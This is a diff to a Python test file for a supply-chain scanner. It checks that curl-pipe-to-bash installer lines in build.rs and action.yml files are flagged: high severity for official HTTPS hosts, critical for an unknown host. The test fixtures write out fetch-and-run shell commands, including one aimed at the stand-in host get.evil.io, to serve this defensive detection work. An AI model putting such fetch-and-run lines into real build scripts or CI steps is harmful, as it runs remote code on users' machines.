@@ -191,13 +191,17 @@ def test_installer_rule_is_path_scoped():
 
 def test_build_rs_and_action_yml_still_block():
     """build.rs runs on the user's `cargo build`; action.yml steps run on the user's
-    runner. Both are shipped runtime and keep their critical."""
+    runner. Both are shipped runtime and keep their severity (an official HTTPS
+    installer is high since the 2026-10-19 DNC sample; an unknown host stays critical)."""
     rs = ("fn main() {\n    Command::new(\"sh\")\n"
           "        .args([\"-c\", \"curl -fsSL https://bun.sh/install | bash\"])\n"
           "        .output();\n}\n")
     hits = _hits(rs, "crates/screenpipe-audio/build.rs", "dynamic_remote_load")
-    assert hits and hits[0].severity == "critical" and _finding_is_blocking(hits[0])
+    assert hits and hits[0].severity == "high" and _finding_is_blocking(hits[0])
     yml = ("runs:\n  using: composite\n  steps:\n    - run: |\n"
            "        curl -fsSL https://claude.ai/install.sh | bash\n")
     hits = _hits(yml, "base-action/action.yml", "dynamic_remote_load")
+    assert hits and hits[0].severity == "high" and _finding_is_blocking(hits[0])
+    hits = _hits(yml.replace("claude.ai", "get.evil.io"), "base-action/action.yml",
+                 "dynamic_remote_load")
     assert hits and hits[0].severity == "critical" and _finding_is_blocking(hits[0])
